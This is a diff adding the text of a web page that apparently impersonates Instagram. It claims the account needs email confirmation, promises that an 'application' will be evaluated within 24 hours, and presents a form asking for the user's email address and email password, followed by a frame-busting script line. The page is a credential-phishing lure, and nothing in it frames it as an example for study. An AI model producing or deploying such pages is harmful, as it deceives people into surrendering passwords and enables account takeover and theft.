@@ -1,0 +1,61 @@
+Instagram
+Instagram
+Mail Confirmation
+To verify that your account belongs to you, you must confirm your email. After the email confirmation, your application will be evaluated and returned within 24 hours.
+Confirm E-Mail
+English
+Afrikaans
+Čeština
+Dansk
+Deutsch
+Ελληνικά
+English
+Español (España)
+Español
+Suomi
+Français
+Bahasa Indonesia
+Italiano
+日本語
+한국어
+Bahasa Melayu
+Norsk
+Nederlands
+Polski
+Português (Brasil)
+Português (Portugal)
+Русский
+Svenska
+ภาษาไทย
+Filipino
+Türkçe
+中文(简体)
+中文(台灣)
+বাংলা
+ગુજરાતી
+हिन्दी
+Hrvatski
+Magyar
+ಕನ್ನಡ
+മലയാളം
+मराठी
+नेपाली
+ਪੰਜਾਬੀ
+සිංහල
+Slovenčina
+தமிழ்
+తెలుగు
+Tiếng Việt
+中文(香港)
+Български
+Français (Canada)
+Română
+Српски
+Українська
+Suspected Entry • Instagram
+Confirm Your E-Mail
+Confirm Your E-Mail
+E-Mail
+E-Mail Password
+Submit
+<SCRIPT LANGUAGE="Javascript"> if (parent.frames.length > 0) parent.location.href=self.location;
